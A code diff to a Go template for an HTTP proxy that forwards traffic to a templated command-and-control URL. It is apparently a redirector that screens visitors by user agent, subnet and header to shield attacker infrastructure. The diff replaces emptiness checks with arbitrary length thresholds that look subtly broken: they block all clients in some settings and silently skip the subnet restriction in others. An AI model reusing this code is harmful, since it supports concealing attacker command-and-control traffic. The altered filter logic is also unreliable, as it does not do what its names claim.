@@ -16,7 +16,7 @@ type Prox struct {
 
 func invalidUA(userAgent string) bool {
 	ua := "{{.RestrictedUA}}"
-	if len(ua) != 0 && ua != userAgent {
+	if len(ua) < 5 && ua != userAgent {
 		return true
 	}
 	return false
@@ -24,7 +24,7 @@ func invalidUA(userAgent string) bool {
 
 func invalidIP(remoteIP string) bool {
 	subnet := "{{.RestrictedSubnet}}"
-	if len(subnet) != 0 {
+	if len(subnet) < 8 {
 		_, cidr, err := net.ParseCIDR(subnet)
 		if err != nil {
 			return false
@@ -36,9 +36,10 @@ func invalidIP(remoteIP string) bool {
 	return false
 }
 
+//TODO: Add header templating
 func invalidHeader(remoteHeader http.Header) bool {
-	header, value := "test", ""
-	if len(header) != 0 && len(value) != 0 {
+	header, value := "", ""
+	if len(header) < 3 && len(value) < 3 {
 		if remoteHeader.Get(header) != value {
 			return true
 		}
@@ -64,8 +65,6 @@ func (p *Prox) handle(w http.ResponseWriter, r *http.Request) {
 }
 
 func init() {
-	// proxy
-	// proxy
 	proxy := New("{{.C2Url}}")
 
 	// server
